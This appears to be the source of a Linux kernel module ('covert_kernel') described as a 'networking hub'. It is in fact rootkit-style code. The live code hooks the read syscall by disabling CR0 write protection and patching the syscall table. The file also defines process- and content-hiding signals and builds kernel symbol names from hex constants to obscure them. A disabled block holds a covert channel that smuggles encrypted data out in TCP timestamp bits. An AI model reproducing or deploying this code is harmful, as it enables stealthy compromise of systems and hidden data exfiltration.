#include <asm/delay.h>
#include <asm/errno.h>
#include <asm/proto.h>
#include <asm/unistd.h>
#include <linux/fs.h>
#include <linux/highmem.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/mman.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/un.h>
#include <net/sock.h>

#include "shared.h"

struct service {
    struct socket* remote_socket;
    struct socket* encrypt_socket;
    struct socket* decrypt_socket;
    struct socket* tls_socket;
    struct task_struct* thread;
};

struct seqack {
    u32 seq;
    u32 ack;
    unsigned char data_bit;
};

struct nf_hook_ops nfhi;
struct nf_hook_ops nfho;
struct service* svc;
struct sock* nl_sk;

static struct seqack seq_history[10];

unsigned char* buffer;
unsigned char* encrypted_test_data;

size_t data_len;
size_t bit_count = 0;
size_t byte_count = 0;

const char* test_data = "This is a test of the covert channel with arbitrary length data.";
const char* encrypt_sock_path = "/var/run/covert_module_encrypt";
const char* decrypt_sock_path = "/var/run/covert_module_decrypt";
const char* tls_sock_path = "/var/run/covert_module_tls";

#if 0
int send_msg(struct socket* sock, unsigned char* buf, size_t len);
int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
int start_transmit(void);
int init_userspace_conn(void);
void UpdateChecksum(struct sk_buff* skb);

void UpdateChecksum(struct sk_buff* skb) {
    struct iphdr* ip_header = ip_hdr(skb);
    skb->ip_summed = CHECKSUM_NONE; //stop offloading
    skb->csum_valid = 0;
    ip_header->check = 0;
    ip_header->check = ip_fast_csum((u8*) ip_header, ip_header->ihl);

    if ((ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP)) {
        if (skb_is_nonlinear(skb)) {
            skb_linearize(skb);
        }

        if (ip_header->protocol == IPPROTO_TCP) {
            unsigned int tcplen;
            struct tcphdr* tcpHdr = tcp_hdr(skb);

            skb->csum = 0;
            tcplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            tcpHdr->check = 0;
            //tcpHdr->check = tcp_v4_check(tcplen, ip_header->saddr, ip_header->daddr,
            //csum_partial((char*) tcpHdr, tcplen, 0));
            tcpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, tcplen,
                    IPPROTO_TCP, csum_partial((char*) tcpHdr, tcplen, 0));

            //printk(KERN_INFO "%s: TCP Len :%d, Computed TCP Checksum :%x : Network : %x\n",prefix,tcplen,tcpHdr->check,htons(tcpHdr->check));

        } else if (ip_header->protocol == IPPROTO_UDP) {
            unsigned int udplen;

            struct udphdr* udpHdr = udp_hdr(skb);
            skb->csum = 0;
            udplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            udpHdr->check = 0;
            //udpHdr->check = udp_v4_check(udplen, ip_header->saddr, ip_header->daddr,
            //csum_partial((char*) udpHdr, udplen, 0));
            udpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, udplen,
                    IPPROTO_UDP, csum_partial((char*) udpHdr, udplen, 0));

            //printk(KERN_INFO "%s: UDP Len :%d, Computed UDP Checksum :%x : Network : %x\n",prefix,udplen,udpHdr->check,htons(udpHdr->check));
        }
    }
}

int recv_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size = 0;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);

    return size;
}

int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_sendmsg(sock, &msg, &iov, 1, len);

    return size;
}

int start_transmit(void) {
    int error;
    int i;
    u32 sleep_len;

#if 0
    int flag = 1;
    struct sockaddr_in sin;
    int size;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &svc->remote_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return -1;
    }

    error = kernel_setsockopt(
            svc->remote_socket, IPPROTO_TCP, TCP_NODELAY, (char*) &flag, sizeof(int));
    if (error < 0) {
        printk(KERN_ERR "cannot set no delay\n");
        return -1;
    }

    //Connect to server ip
    //sin.sin_addr.s_addr = htonl(SERVER_IP);
    sin.sin_addr.s_addr = SERVER_IP;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    error = kernel_connect(svc->remote_socket, (struct sockaddr*) &sin, sizeof(sin), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect to server, error code: %d\n", error);
        return -1;
    }
#endif

    for (i = 0; i < 64; ++i) {
        buffer[i] = i;
    }

    while (!kthread_should_stop() && (byte_count < data_len) && (bit_count < 8)) {
        //Send garbage message to server
#if 0
        error = send_msg(svc->remote_socket, buffer, 64);
#else
        error = send_msg(svc->tls_socket, buffer, 64);
#endif
        if (error < 0) {
            printk(KERN_ERR "cannot send message, error code: %d\n", error);
            return -1;
        }

        get_random_bytes(&sleep_len, sizeof(u32));
        sleep_len %= SLEEP_MS;

        //Sleep for 200ms
        msleep(sleep_len);
    }
    return 0;
}

int init_userspace_conn(void) {
    int error;
    struct sockaddr_un sun;

    //Encryption socket
    error = sock_create(AF_UNIX, SOCK_SEQPACKET, 0, &svc->encrypt_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, encrypt_sock_path);

    error = kernel_connect(svc->encrypt_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on encrypt socket, error code: %d\n", error);
        return error;
    }

    //Decryption socket
    error = sock_create(AF_UNIX, SOCK_SEQPACKET, 0, &svc->decrypt_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, decrypt_sock_path);

    error = kernel_connect(svc->decrypt_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }

    //TLS socket
    error = sock_create(AF_UNIX, SOCK_SEQPACKET, 0, &svc->tls_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, tls_sock_path);

    error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }
    return 0;
}

unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    unsigned char* packet_data;
    unsigned char* timestamps = NULL;
    int i;
    u32 old_timestamp;

    if (ip_header->protocol == 6) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);
        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);

        if (ntohs(tcp_header->source) == 666) {
            if (tcp_header->doff > 5) {
                //Move to the start of the tcp options
                timestamps = skb->data + (ip_header->ihl * 4) + 20;
                for (i = 0; i < tcp_header->doff - 5; ++i) {
                    if (*timestamps == 0x00) {
                        //End of options
                        timestamps = NULL;
                        break;
                    }
                    if (*timestamps == 0x01) {
                        //NOP
                        ++timestamps;
                    } else if (*timestamps == 8) {
                        //Timestamp option
                        if (timestamps[1] != 10) {
                            printk(KERN_INFO "Timestamp option was malformed\n");
                            continue;
                        }

                        //EVEN IS 0, ODD IS 1
                        //Undo receive timestamp increment to prevent issues with the stack
                        old_timestamp = ntohl(*((u32*) (timestamps + 2)));
                        --old_timestamp;
                        *((u32*) (timestamps + 2)) = htonl(old_timestamp);
                        UpdateChecksum(skb);
                    } else if (*timestamps == 3) {
                        timestamps += 3;
                    } else if (*timestamps == 4) {
                        timestamps += 2;
                    } else if (*timestamps == 5) {
                        timestamps += timestamps[1];
                    } else {
                        timestamps += 4;
                    }
                }
            }
            return NF_ACCEPT;
        }
    }
    return NF_ACCEPT;
    return NF_ACCEPT;
}

unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    unsigned char* packet_data;
    size_t packet_len;
    unsigned char* timestamps = NULL;
    int i;
    int j;
    int hist_index = 0;
    unsigned char resend_found = false;
    u32 old_timestamp;

    if (ip_header->protocol == 6) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);
        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
        packet_len = ntohs(ip_header->tot_len) - ((ip_header->ihl + tcp_header->doff) * 4);

        printk(KERN_INFO "Packet length %lu\n", packet_len);

        if (ntohs(tcp_header->dest) == 666 && !tcp_header->syn && tcp_header->psh
                && packet_len > 0) {
            if (tcp_header->doff > 5) {
                //Move to the start of the tcp options
                timestamps = skb->data + (ip_header->ihl * 4) + 20;
                for (i = 0; i < tcp_header->doff - 5; ++i) {
                    if (*timestamps == 0x00) {
                        //End of options
                        timestamps = NULL;
                        break;
                    }
                    if (*timestamps == 0x01) {
                        //NOP
                        ++timestamps;
                    } else if (*timestamps == 8) {
                        //Timestamp option
                        if (timestamps[1] != 10) {
                            printk(KERN_INFO "Timestamp option was malformed\n");
                            continue;
                        }

                        //EVEN IS 0, ODD IS 1

                        //Save old timestamp
                        old_timestamp = ntohl(*((u32*) (timestamps + 2)));

#if 1
                        //Loop through history buffer to check for resend
                        for (j = 0; j < 10; ++j) {
                            if (seq_history[j].seq == tcp_header->seq
                                    && seq_history[j].ack == tcp_header->ack_seq) {
                                printk(KERN_INFO "Resend found\n");
                                printk(KERN_INFO "SEQ %u\n", tcp_header->seq);
                                printk(KERN_INFO "SEQ %lu\n", data_len);
                                resend_found = true;
                                //This is a resend packet
                                if (old_timestamp & 1) {
                                    if (seq_history[j].data_bit) {
                                        //Data is 1, and timestamp is odd
                                        //Do nothing
                                    } else {
                                        //Data is 0, and timestamp is odd
                                        ++old_timestamp;
                                    }
                                } else {
                                    if (seq_history[j].data_bit) {
                                        //Data is 1, and timestamp is even
                                        ++old_timestamp;
                                    } else {
                                        //Data is 0, and timestamp is even
                                        //Do nothing
                                    }
                                }
                                break;
                            }
                        }
                        if (resend_found) {
                            //Write modified timestamp back
                            *((u32*) (timestamps + 2)) = htonl(old_timestamp);
                            UpdateChecksum(skb);
                            return NF_ACCEPT;
                        }
#endif

                        //Modify last bit of send timestamp based on data
                        if (old_timestamp & 1) {
                            if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
                                //Data is 1, and timestamp is odd
                                //Do nothing
                                return NF_DROP;
                            } else {
                                printk(KERN_INFO "Old timestamp %u\n", old_timestamp);
                                //Data is 0, and timestamp is odd
                                //Increment timestamp so that it is even
                                ++old_timestamp;
                                printk(KERN_INFO "Writing a 0\n");
                            }
                        } else {
                            if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
                                printk(KERN_INFO "Old timestamp %u\n", old_timestamp);
                                //Data is 1, and timestamp is even
                                //Increment timestamp so that it is odd
                                ++old_timestamp;
                                printk(KERN_INFO "Writing a 1\n");
                            } else {
                                //Data is 0, and timestamp is even
                                //Do nothing
                                return NF_DROP;
                            }
                        }
                        printk(KERN_INFO "New timestamp %u\n", old_timestamp);

                        //Write modified timestamp back
                        *((u32*) (timestamps + 2)) = htonl(old_timestamp);

                        UpdateChecksum(skb);

                        seq_history[hist_index].seq = tcp_header->seq;
                        seq_history[hist_index].ack = tcp_header->ack_seq;
                        seq_history[hist_index].data_bit
                                = !!(encrypted_test_data[byte_count] & (1 << bit_count));

                        hist_index = (hist_index + 1) % 10;

                        if (bit_count == 7) {
                            ++byte_count;
                            printk(KERN_INFO "New current byte %zu\n", byte_count);
                        }
                        bit_count = (bit_count + 1) % 8;

                    } else if (*timestamps == 3) {
                        timestamps += 3;
                    } else if (*timestamps == 4) {
                        timestamps += 2;
                    } else if (*timestamps == 5) {
                        timestamps += timestamps[1];
                    } else {
                        timestamps += 4;
                    }
                }
            }
            return NF_ACCEPT;
        }
    }
    return NF_ACCEPT;
}
#endif

#define SIGROOT 48
#define SIGHIDEPROC 49
#define SIGHIDEREPTILE 50
#define SIGHIDECONTENT 51
#define SSIZE_MAX 32767
#define SYS_CALL_TABLE \
    ({ \
        unsigned int* p = (unsigned int*) __builtin_alloca(16); \
        p[0] = 0x5f737973; \
        p[1] = 0x6c6c6163; \
        p[2] = 0x6261745f; \
        p[3] = 0x0000656c; \
        (char*) p; \
    })

#define SYS_CLOSE \
    ({ \
        unsigned int* p = (unsigned int*) __builtin_alloca(12); \
        p[0] = 0x5f737973; \
        p[1] = 0x736f6c63; \
        p[2] = 0x00000065; \
        (char*) p; \
    })

static void** sct;
atomic_t read_on;

#define VFS_READ \
    ({ \
        unsigned int* p = (unsigned int*) __builtin_alloca(9); \
        p[0] = 0x5f736676; \
        p[1] = 0x64616572; \
        p[2] = 0x00; \
        (char*) p; \
    })

asmlinkage ssize_t (*vfs_read_addr)(struct file* file, char __user* buf, size_t count, loff_t* pos);

asmlinkage int (*o_kill)(pid_t pid, int sig);
asmlinkage int (*o_getdents64)(
        unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count);
asmlinkage int (*o_getdents)(
        unsigned int fd, struct linux_dirent __user* dirent, unsigned int count);
asmlinkage ssize_t (*o_read)(unsigned int fd, char __user* buf, size_t count);

asmlinkage int l33t_kill(pid_t pid, int sig);
asmlinkage int l33t_getdents64(
        unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count);
asmlinkage int l33t_getdents(
        unsigned int fd, struct linux_dirent __user* dirent, unsigned int count);
asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count);

struct shell_task {
    struct work_struct work;
    char* path;
    char* ip;
    char* port;
};

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

struct ksym {
    char* name;
    unsigned long addr;
};

/*
 * from: http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html
 */
unsigned long** get_syscalltable(void) {
    int i, lo, hi;
    unsigned char* ptr;
    unsigned long system_call;

    printk(KERN_ALERT "GETTING SYS_CALL_TABLE");

    /* http://wiki.osdev.org/Inline_Assembly/Examples#RDMSR */
    asm volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(MSR_LSTAR));
    system_call = (unsigned long) (((long) hi << 32) | lo);

    /* loop until first 3 bytes of instructions are found */
    for (ptr = (unsigned char*) system_call, i = 0; i < 500; i++) {
        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
            printk(KERN_INFO "SYS_CALL_TABLE FOUND");
            /* set address together */
            return (unsigned long**) (0xffffffff00000000 | *((unsigned int*) (ptr + 3)));
        }

        ptr++;
    }

    printk(KERN_INFO "SYS_CALL_TABLE NOT FOUND");

    return NULL;
}

/* disable page protection */
void disable_page_protection(void) {
    printk(KERN_ALERT "DISABLE_PAGE_PROTECTION");
    write_cr0(read_cr0() & (~0x10000));
}

/* enable page protection */
void enable_page_protection(void) {
    printk(KERN_ALERT "ENABLE_PAGE_PROTECTION");
    write_cr0(read_cr0() | 0x10000);
}

asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count) {
    struct file* f;
    int fput_needed;
    ssize_t ret;
    printk(KERN_ALERT "HOOKING SYSCALL READ WORKED\n");
    ret = o_read(fd, buf, count);

#if 0
    if (hide_file_content) {
        ret = -EBADF;

        atomic_set(&read_on, 1);
        f = e_fget_light(fd, &fput_needed);

        if (f) {
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
            ret = vfs_read(f, buf, count, &f->f_pos);
#else
            ret = vfs_read_addr(f, buf, count, &f->f_pos);
#endif
            if (f_check(buf, ret) == 1)
                ret = hide_content(buf, ret);

            fput_light(f, fput_needed);
        }
        atomic_set(&read_on, 0);
    } else {
        ret = o_read(fd, buf, count);
    }
#endif

    return ret;
}

#if 0
unsigned long* find_sys_call_table(void) {
    unsigned long sct_off = 0;
    unsigned char code[512];
    char** p;

    rdmsrl(MSR_LSTAR, sct_off);
    //rdmsrl(MSR_STAR, sct_off);
    //rdmsrl(MSR_CSTAR, sct_off);
    //rdmsrl(MSR_IA32_SYSENTER_CS, sct_off);
    //rdmsrl(MSR_IA32_SYSENTER_ESP, sct_off);
    //rdmsrl(MSR_IA32_SYSENTER_EIP, sct_off);
    memcpy(code, (void*) sct_off, sizeof(code));

    printk(KERN_INFO "sct offset %p\n", (void*) sct_off);

    //p = (char**) memmem(code, sizeof(code), "\xff\x14\xc5", 3);
    p = (char**) sct_off;

    if (p) {
        unsigned long* table = *(unsigned long**) ((char*) p + 3);
        table = (unsigned long*) (((unsigned long) table & 0xffffffff) | 0xffffffff00000000);
        return table;
    }
    return NULL;
}
#endif

static int __init mod_init(void) {
    int err;

    sct = (void**) get_syscalltable();

    //printk(KERN_INFO "Kernel syscall table address %p\n", sct);
    //printk(KERN_INFO "old read value %d\n", __NR_read);
    //printk(KERN_INFO "old read address %p\n", *sct);
    //printk(KERN_INFO "old read address %p\n", sct[__NR_read]);

    printk(KERN_INFO "Pre save read\n");
    o_read = (void*) sct[__NR_read];
    printk(KERN_INFO "Post save read\n");

    printk(KERN_INFO "Pre write cr0\n");

    disable_page_protection();
    printk(KERN_INFO "Post write cr0\n");
    printk(KERN_INFO "Pre read assign\n");
    sct[__NR_read] = (int*) l33t_read;
    printk(KERN_INFO "Post read assign\n");
    printk(KERN_INFO "Pre rewrite cr0\n");
    enable_page_protection();
    printk(KERN_INFO "Post rewrite cr0\n");

    return 0;
}

static void __exit mod_exit(void) {
    disable_page_protection();
    sct[__NR_read] = (int*) o_read;
    enable_page_protection();
    printk(KERN_ALERT "removed covert_kernel module\n");
    return;
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_DESCRIPTION("Kernel based networking hub");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Agapeyev <jagapeyev@gmail.com>");
